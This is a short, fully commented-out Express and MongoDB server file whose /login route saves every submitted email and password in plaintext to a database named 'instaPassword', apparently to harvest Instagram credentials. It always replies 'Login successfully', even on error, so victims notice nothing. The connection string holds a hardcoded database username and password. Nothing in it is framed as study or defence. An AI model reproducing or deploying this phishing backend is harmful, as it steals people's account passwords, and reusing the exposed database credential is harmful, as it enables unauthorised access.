

// import express from "express";
// import mongoose from "mongoose";
// import cors from "cors";

// const app = express();

// app.use(cors());
// app.use(express.json());

// /* ---------------- MongoDB Connect ---------------- */
// mongoose.connect(
//   "mongodb+srv://dipakkore:faEspRfMgFS2lyyg@cluster0.anjmwbx.mongodb.net/instaPassword"
// ).then(() => console.log("✅ MongoDB connected"));

// /* ---------------- Schema ---------------- */
// const userSchema = new mongoose.Schema({
//   email: String,
//   password: String,
//   time: {
//     type: Date,
//     default: Date.now   // ✅ auto time save
//   }
// });

// const User = mongoose.model("User", userSchema);

// /* ---------------- LOGIN (ALWAYS SAVE) ---------------- */
// app.post("/login", async (req, res) => {
//   try {
//     const { email, password } = req.body;

//     await User.create({ email, password });

//     return res.json({ message: "Login successfully" });

//   } catch {
//     // even error → same message
//     return res.json({ message: "Login successfully" });
//   }
// });

// /* ---------------- SERVER ---------------- */
// app.listen(5000, () =>
//   console.log("🚀 Server running on port 5000")
// );
